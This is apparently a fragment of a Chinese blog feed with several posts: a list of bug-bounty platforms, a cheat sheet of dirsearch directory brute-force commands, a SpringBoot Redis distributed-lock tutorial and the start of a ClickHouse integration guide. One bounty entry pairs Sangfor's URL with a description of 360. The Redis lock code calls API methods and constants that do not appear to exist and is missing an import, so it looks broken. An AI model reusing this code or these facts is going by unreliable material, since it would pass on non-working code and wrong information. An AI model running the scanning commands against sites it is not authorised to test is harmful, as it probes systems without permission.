<h3 id="平安src"><a href="#平安src" class="headerlink" title="平安src"></a>平安src</h3><blockquote>
<p>网址：<a href="https://security.pingan.com/">https://security.pingan.com/</a></p>
</blockquote>
<p>平安集团的漏洞收集平台，金融行业顶尖的SRC之一。白帽子可提交平安旗下银行、证券、保险等业务系统的漏洞，漏洞评级清晰，奖励丰厚，高危漏洞直接到账，月度榜单前五额外加码，季度榜一送理财金，是金融安全领域的“现金奶牛”。</p>
<h3 id="漏洞盒子"><a href="#漏洞盒子" class="headerlink" title="漏洞盒子"></a>漏洞盒子</h3><blockquote>
<p>网址：<a href="https://www.vulbox.com/">https://www.vulbox.com/</a></p>
</blockquote>
<p>综合性众测平台，覆盖众多行业。漏洞盒子提供丰富的众测项目，从互联网企业到传统行业都有涉及。平台奖励机制灵活，除了现金奖励外，还有积分兑换实物奖品等福利。漏洞盒子注重漏洞的挖掘和修复闭环管理，是白帽子练手和赚取收益的好去处。</p>
<h3 id="edusrc"><a href="#edusrc" class="headerlink" title="edusrc"></a>edusrc</h3><blockquote>
<p>网址：<a href="https://src.sjtu.edu.cn/">https://src.sjtu.edu.cn/</a></p>
</blockquote>
<p>面向教育行业的SRC平台，专注于高校、教育机构的信息安全。白帽子可以提交教育系统、在线学习平台等的漏洞。EduSRC注重安全教育和人才培养，除了奖励机制外，还提供安全培训和交流机会，帮助白帽子提升技术水平，是教育安全领域的“知识宝库”。</p>
<h3 id="斗鱼src"><a href="#斗鱼src" class="headerlink" title="斗鱼src"></a>斗鱼src</h3><blockquote>
<p>网址：<a href="https://security.douyu.com/#/welcome">https://security.douyu.com/#/welcome</a></p>
</blockquote>
<p>斗鱼直播的安全众测平台，聚焦直播和游戏领域。白帽子可以提交斗鱼直播平台、游戏相关系统的漏洞。斗鱼SRC奖励及时，高危漏洞快速审核和支付。平台还设有季度榜单，上榜者可获得额外奖励和荣誉，是直播行业安全的“守护者”。</p>
<h3 id="SSRC"><a href="#SSRC" class="headerlink" title="SSRC"></a>SSRC</h3><blockquote>
<p>网址：<a href="https://security.sangfor.com.cn/">https://security.sangfor.com.cn/</a></p>
</blockquote>
<p>360的安全应急响应中心，是网络安全领域的老牌SRC。白帽子可以提交360旗下各类产品的漏洞，包括浏览器、杀毒软件、智能家居等。360SRC以高赏金和快速响应著称，漏洞提交后审核迅速，奖励丰厚。平台还定期举办安全活动，吸引众多白帽子参与，是网络安全的“重镇”。</p>
<h3 id="火线安全平台"><a href="#火线安全平台" class="headerlink" title="火线安全平台"></a>火线安全平台</h3><blockquote>
<p>网址：<a href="https://www.huoxian.cn/testin">https://www.huoxian.cn/testin</a></p>
</blockquote>
<p>火线安全平台是一个新兴的众测平台，专注于互联网和新兴技术领域的漏洞挖掘。平台提供多样化的众测项目，涵盖人工智能、大数据、云计算等领域。火线安全注重技术创新和安全研究，为白帽子提供前沿的技术交流机会和丰厚的奖励，是新兴安全领域的“新星”。</p>
<h3 id="百度src"><a href="#百度src" class="headerlink" title="百度src"></a>百度src</h3><blockquote>
<p>网址：<a href="https://bsrc.baidu.com/views/main/index.html#home">https://bsrc.baidu.com/views/main/index.html#home</a></p>
</blockquote>
<p>百度的安全众测平台，覆盖百度旗下众多产品和服务。白帽子可以提交百度搜索引擎、百度云、百度地图等的漏洞。百度SRC奖励机制完善，高危漏洞直接到账，月度榜单有额外奖励。平台还提供安全技术分享和交流机会，是互联网安全领域的“技术高地”。</p>
<h3 id="美团src"><a href="#美团src" class="headerlink" title="美团src"></a>美团src</h3><blockquote>
<p>网址：<a href="https://security.meituan.com/#/home">https://security.meituan.com/#/home</a></p>
</blockquote>
<p>美团的安全众测平台，聚焦美团外卖、美团点评等业务。白帽子可以提交美团相关系统的漏洞。美团SRC注重漏洞的快速修复和奖励的及时发放，高危漏洞快速审核和支付。平台还设有季度榜单，上榜者可获得额外奖励和荣誉，是生活服务领域安全的“守护者”。</p>
<h3 id="荣耀src"><a href="#荣耀src" class="headerlink" title="荣耀src"></a>荣耀src</h3><blockquote>
<p>网址：<a href="https://security.honor.com/src/#/home">https://security.honor.com/src/#/home</a></p>
</blockquote>
<p>荣耀手机的安全众测平台，专注于荣耀手机及相关生态产品的漏洞收集。白帽子可以提交荣耀手机系统、荣耀IoT设备等的漏洞。荣耀SRC奖励丰厚，高危漏洞快速审核和支付，月度榜单有额外奖励。平台还提供与荣耀安全团队直接交流的机会，是智能设备安全的“护盾”。</p>
<h3 id="顺丰src"><a href="#顺丰src" class="headerlink" title="顺丰src"></a>顺丰src</h3><blockquote>
<p>网址：<a href="https://sfsrc.sf-express.com/home">https://sfsrc.sf-express.com/home</a></p>
</blockquote>
<p>顺丰的安全众测平台，聚焦顺丰快递、物流系统等业务。白帽子可以提交顺丰相关系统的漏洞。顺丰SRC注重漏洞的快速修复和奖励的及时发放，高危漏洞快速审核和支付。平台还设有季度榜单，上榜者可获得额外奖励和荣誉，是物流行业安全的“防线”。</p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker总结四【Dirsearch目录扫描工具】</title>
    <url>/cnblogs.github.io/p/4d4c.html</url>
    <content><![CDATA[<blockquote>
<p>Dirsearch</p>
</blockquote>
<p>简介dirsearch是一个基于Python的命令行工具，用于对网站目录和文件进行暴力破解扫描。它通过尝试大量可能的路径和文件名来发现隐藏资源，是渗透测试中常用的信息收集工具。<br><strong>主要特性：</strong></p>
<ul>
<li>多线程高性能扫描</li>
<li>支持多种请求方法（GET、POST等）</li>
<li>可自定义字典和扩展名</li>
<li>支持递归扫描</li>
<li>丰富的过滤和输出选项</li>
<li>代理和身份验证支持</li>
</ul>
<p>常用命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基本扫描</span></span><br><span class="line">dirsearch -u http://example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定字典文件</span></span><br><span class="line">dirsearch -u http://example.com -w /path/to/wordlist.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描特定扩展名</span></span><br><span class="line">dirsearch -u http://example.com -e php,asp,aspx,jsp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归扫描</span></span><br><span class="line">dirsearch -u http://example.com -r</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递设置线程数</span></span><br><span class="line">dirsearch -u http://example.com -t 50</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排除状态码</span></span><br><span class="line">dirsearch -u http://example.com --exclude-status 404,403</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用代理</span></span><br><span class="line">dirsearch -u http://example.com --proxy http://127.0.0.1:8080</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加HTTP头</span></span><br><span class="line">dirsearch -u http://example.com -H &quot;Authorization: Bearer token&quot; -H &quot;X-Custom-Header: value&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成报告</span></span><br><span class="line">dirsearch -u http://example.com -o report.html --format html</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅扫描目录</span></span><br><span class="line">dirsearch -u http://example.com --only-dirs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归扫描深度</span></span><br><span class="line">dirsearch -u http://example.com -r --recursion-depth 2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>详细命令参数</p>
</blockquote>
<p>用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch.py [-h|--help] [-u|--url] target_url [options]</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-u URL, –url&#x3D;URL</td>
<td>目标URL</td>
</tr>
<tr>
<td>-l FILE, –url-list&#x3D;FILE</td>
<td>目标URL列表文件</td>
</tr>
<tr>
<td>-w FILE, –wordlist&#x3D;FIL</td>
<td>自定义字典文件</td>
</tr>
<tr>
<td>-e EXTENSIONS, –extensions&#x3D;EXTENSIONS</td>
<td>扩展名列表（逗号分隔）</td>
</tr>
<tr>
<td>–prefixes&#x3D;PREFIXES</td>
<td>路径前缀（逗号分隔）</td>
</tr>
<tr>
<td>–suffixes&#x3D;SUFFIXES</td>
<td>路径后缀（逗号分隔）</td>
</tr>
<tr>
<td>-f, –force-extensions</td>
<td>强制尝试所有扩展名</td>
</tr>
<tr>
<td>-m METHOD, –http-method&#x3D;METHOD</td>
<td>HTTP方法（GET, POST等）</td>
</tr>
<tr>
<td>-d DATA, –data&#x3D;DATA</td>
<td>POST请求数据</td>
</tr>
<tr>
<td>-H HEADER, –header&#x3D;HEADER</td>
<td>自定义HTTP头</td>
</tr>
<tr>
<td>–user-agent&#x3D;AGENT</td>
<td>自定义User-Agent</td>
</tr>
<tr>
<td>–random-agent</td>
<td>随机User-Agent</td>
</tr>
<tr>
<td>–cookie&#x3D;COOKIE</td>
<td>Cookie值</td>
</tr>
<tr>
<td>–timeout&#x3D;TIMEOUT</td>
<td>请求超时（秒）</td>
</tr>
<tr>
<td>–delay&#x3D;DELAY</td>
<td>请求间延迟（秒）</td>
</tr>
<tr>
<td>–proxy&#x3D;PROXY</td>
<td>代理服务器</td>
</tr>
<tr>
<td>–http-proxy&#x3D;HTTP_PROXY</td>
<td>HTTP代理</td>
</tr>
<tr>
<td>–https-proxy&#x3D;HTTPS_PROXY</td>
<td>HTTPS代理</td>
</tr>
<tr>
<td>-r, –recursive</td>
<td>启用递归扫描</td>
</tr>
<tr>
<td>–recursion-depth&#x3D;DEPTH</td>
<td>最大递归深度</td>
</tr>
<tr>
<td>–recursion-status&#x3D;CODES</td>
<td>触发递归的状态码（默认200,204,301,302,307,401,403）</td>
</tr>
<tr>
<td>-t THREADS, –threads&#x3D;THREADS</td>
<td>线程数（默认25）</td>
</tr>
<tr>
<td>-s DELAY, –delay&#x3D;DELAY</td>
<td>请求间延迟（秒）</td>
</tr>
<tr>
<td>-F, –follow-redirects</td>
<td>跟随重定向</td>
</tr>
<tr>
<td>–full-url</td>
<td>输出完整URL</td>
</tr>
<tr>
<td>–scan-subdir&#x3D;SUBDIRS</td>
<td>扫描指定子目录</td>
</tr>
<tr>
<td>–exclude-subdir&#x3D;SUBDIRS</td>
<td>排除指定子目录</td>
</tr>
<tr>
<td>-o FILE, –output&#x3D;FILE</td>
<td>输出文件</td>
</tr>
<tr>
<td>–format&#x3D;FORMAT</td>
<td>输出格式（plain,json,xml,html）</td>
</tr>
<tr>
<td>–no-color</td>
<td>禁用彩色输出</td>
</tr>
<tr>
<td>-q, –quiet</td>
<td>安静模式</td>
</tr>
<tr>
<td>-v, –verbose</td>
<td>详细输出</td>
</tr>
<tr>
<td>–status-codes&#x3D;CODES</td>
<td>仅显示指定状态码</td>
</tr>
<tr>
<td>–exclude-status&#x3D;CODES</td>
<td>排除指定状态码</td>
</tr>
<tr>
<td>–minimal&#x3D;LENGTH</td>
<td>最小响应长度</td>
</tr>
<tr>
<td>–maximal&#x3D;LENGTH</td>
<td>最大响应长度</td>
</tr>
<tr>
<td>–skip-on-status&#x3D;CODES</td>
<td>遇到这些状态码跳过当前目录</td>
</tr>
<tr>
<td>-h, –help</td>
<td>显示帮助</td>
</tr>
<tr>
<td>–version</td>
<td>显示版本</td>
</tr>
<tr>
<td>–update</td>
<td>更新工具</td>
</tr>
<tr>
<td>–list-extensions</td>
<td>显示可用扩展名列表</td>
</tr>
<tr>
<td>–extensions-info</td>
<td>显示扩展名信息</td>
</tr>
<tr>
<td>–no-error-log</td>
<td>禁用错误日志</td>
</tr>
</tbody></table>
<p><strong>使用示例</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">基本扫描（PHP文件）</span></span><br><span class="line">dirsearch -u http://example.com -e php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归扫描（最大深度2）</span></span><br><span class="line">dirsearch -u http://example.com -r --recursion-depth 2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">带身份验证的扫描</span></span><br><span class="line">dirsearch -u http://example.com -H &quot;Authorization: Basic dXNlcjpwYXNz&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描特定目录</span></span><br><span class="line">dirsearch -u http://example.com/admin --scan-subdir=login,config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成HTML报告</span></span><br><span class="line">dirsearch -u http://example.com -o scan_report.html --format html</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用代理和自定义UA</span></span><br><span class="line">dirsearch -u http://example.com --proxy http://127.0.0.1:8080 --user-agent &quot;Mozilla/5.0 (Custom)&quot;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2功能一【Redis实现分布式锁】</title>
    <url>/cnblogs.github.io/p/33393.html</url>
    <content><![CDATA[<p><strong>添加依赖</strong><br>在 Spring Boot 项目的 pom.xml 文件中，添加 Spring Data Redis 依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>配置 Redis 连接</strong><br>在 application.yml 文件中，配置 Redis 的连接信息，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring:</span><br><span class="line">  redis:</span><br><span class="line">    host: localhost</span><br><span class="line">    port: 6379</span><br><span class="line">    password: </span><br><span class="line">    database: 0</span><br></pre></td></tr></table></figure>
<p><strong>创建 Redis 配置类</strong><br>创建一个 Redis 配置类，用于配置 Redis 连接工厂等相关信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; redisTemplate = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        redisTemplate.setConnectionFactory(redisConnectionFactory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置key的序列化方式</span></span><br><span class="line">        redisTemplate.setKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">        <span class="comment">// 设置value的序列化方式</span></span><br><span class="line">        redisTemplate.setValueSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>创建 RedisLock 类</strong><br>创建一个 RedisLock 类，用于实现获取锁和释放锁的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisLock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_SUCCESS</span> <span class="operator">=</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SET_IF_NOT_EXIST</span> <span class="operator">=</span> <span class="string">&quot;NX&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SET_WITH_EXPIRE_TIME</span> <span class="operator">=</span> <span class="string">&quot;EX&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RELEASE_SUCCESS</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String RELEASE_LUA;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;if redis.call(\&quot;get\&quot;,KEYS[1]) == ARGV[1] &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;then &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;    return redis.call(\&quot;del\&quot;,KEYS[1]) &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;else &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;    return 0 &quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;end &quot;</span>);</span><br><span class="line">        RELEASE_LUA = sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String clientId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RedisLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clientId = UUID.randomUUID().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取锁</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(String key, <span class="type">long</span> timeout, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> redisTemplate.opsForValue().set(key, clientId, timeout, unit, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME);</span><br><span class="line">        <span class="keyword">return</span> LOCK_SUCCESS.equals(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放锁</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">releaseLock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> redisTemplate.execute(</span><br><span class="line">                (connection) -&gt; connection.eval(</span><br><span class="line">                        RELEASE_LUA.getBytes(),</span><br><span class="line">                        org.springframework.data.redis.connection.RedisStringCommands.LuaScript.KEEP_SCRIPT,</span><br><span class="line">                        <span class="number">1</span>,</span><br><span class="line">                        key.getBytes(),</span><br><span class="line">                        clientId.getBytes()</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> RELEASE_SUCCESS.equals(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用 RedisLock</strong><br>在业务代码中，使用 RedisLock 来获取锁和释放锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisLock redisLock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_KEY</span> <span class="operator">=</span> <span class="string">&quot;test_lock&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">locked</span> <span class="operator">=</span> redisLock.tryLock(LOCK_KEY, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">if</span> (locked) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 执行业务逻辑</span></span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;业务逻辑执行完成，锁已释放&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                redisLock.releaseLock(LOCK_KEY);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;获取锁失败，请稍后重试&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;操作异常&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot2集成一【ClickHouse框架】</title>
    <url>/cnblogs.github.io/p/43c0.html</url>
    <content><![CDATA[<p>该案例基于：SpringBoot2, Druid连接池和mybatis进行整合。Druid 1.1.10 版本 SQL Parser对clickhouse的开始提供支持。</p>
<h2 id="核心依赖"><a href="#核心依赖" class="headerlink" title="核心依赖"></a>核心依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ru.yandex.clickhouse<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>clickhouse-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.1.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="配属数据源"><a href="#配属数据源" class="headerlink" title="配属数据源"></a>配属数据源</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">click:</span></span><br><span class="line">      <span class="attr">driverClassName:</span> <span class="string">ru.yandex.clickhouse.ClickHouseDriver</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">jdbc:clickhouse://127.0.0.1:8123/default</span></span><br><span class="line">      <span class="attr">initialSize:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">maxActive:</span> <span class="number">100</span></span><br><span class="line">      <span class="attr">minIdle:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">maxWait:</span> <span class="number">6000</span></span><br></pre></td></tr></table></figure>
<h2 id="Druid连接池配置"><a href="#Druid连接池配置" class="headerlink" title="Druid连接池配置"></a>Druid连接池配置</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DruidConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> JdbcParamConfig jdbcParamConfig ;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">datasource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        datasource.setUrl(jdbcParamConfig.getUrl());</span><br><span class="line">        datasource.setDriverClassName(jdbcParamConfig.getDriverClassName());</span><br><span class="line">        datasource.setInitialSize(jdbcParamConfig.getInitialSize());</span><br><span class="line">        datasource.setMinIdle(jdbcParamConfig.getMinIdle());</span><br><span class="line">        datasource.setMaxActive(jdbcParamConfig.getMaxActive());</span><br><span class="line">        datasource.setMaxWait(jdbcParamConfig.getMaxWait());</span><br><span class="line">        <span class="keyword">return</span> datasource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参数配置类"><a href="#参数配置类" class="headerlink" title="参数配置类"></a>参数配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;spring.datasource.click&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcParamConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String driverClassName ;</span><br><span class="line">    <span class="keyword">private</span> String url ;</span><br><span class="line">    <span class="keyword">private</span> Integer initialSize ;</span><br><span class="line">    <span class="keyword">private</span> Integer maxActive ;</span><br><span class="line">    <span class="keyword">private</span> Integer minIdle ;</span><br><span class="line">    <span class="keyword">private</span> Integer maxWait ;</span><br><span class="line">    <span class="comment">// 省略 GET 和 SET</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mapper接口"><a href="#Mapper接口" class="headerlink" title="Mapper接口"></a>Mapper接口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserInfoMapper</span> &#123;</span><br><span class="line">    <span class="comment">// 写入数据</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">saveData</span> <span class="params">(UserInfo userInfo)</span> ;</span><br><span class="line">    <span class="comment">// ID 查询</span></span><br><span class="line">    UserInfo <span class="title function_">selectById</span> <span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> Integer id)</span> ;</span><br><span class="line">    <span class="comment">// 查询全部</span></span><br><span class="line">    List <span class="title function_">selectList</span> <span class="params">()</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mapper-xml文件"><a href="#Mapper-xml文件" class="headerlink" title="Mapper.xml文件"></a>Mapper.xml文件</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.click.house.mapper.UserInfoMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.click.house.entity.UserInfo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 